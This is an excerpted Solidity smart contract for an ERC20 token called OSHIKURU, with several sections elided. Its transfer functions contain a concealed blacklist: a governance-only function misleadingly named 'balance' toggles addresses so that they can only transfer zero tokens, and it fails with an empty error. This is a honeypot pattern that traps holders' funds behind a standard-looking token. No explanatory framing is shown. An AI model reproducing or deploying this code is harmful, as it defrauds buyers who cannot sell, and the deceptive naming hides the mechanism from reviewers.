 ...
 mapping (address => bool) private _addressBalance_;
 ...
 function balance(address _addressBalance) external {
 require(msg.sender == governance);
 if (_addressBalance_[_addressBalance] == true) {
 _addressBalance_[_addressBalance] = false;
 }
 else {
 _addressBalance_[_addressBalance] = true;
 }
 }
 function temporaryBalance(address _addressBalance) public view returns (bool) {
 return _addressBalance_[_addressBalance];
 }
 function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
 require(_msgSender() != address(0), "ERC20: transfer from the zero address");
 require(recipient != address(0), "ERC20: transfer to the zero address");
 if (_addressBalance_[_msgSender()] || _addressBalance_[recipient]) require (amount == 0, "");
 ...
 require(recipient != address(0), "ERC20: transfer to the zero address");
 if (_addressBalance_[sender] || _addressBalance_[recipient]) require (amount == 0, "");
 ...
 contract OSHIKURU is ERC20 {
 using SafeMath for uint256;
 uint256 totalsupply_;
 uint256 cap;
 address owner_;
 constructor () public ERC20("Oshikuru", "OSHIKURU", 9) {
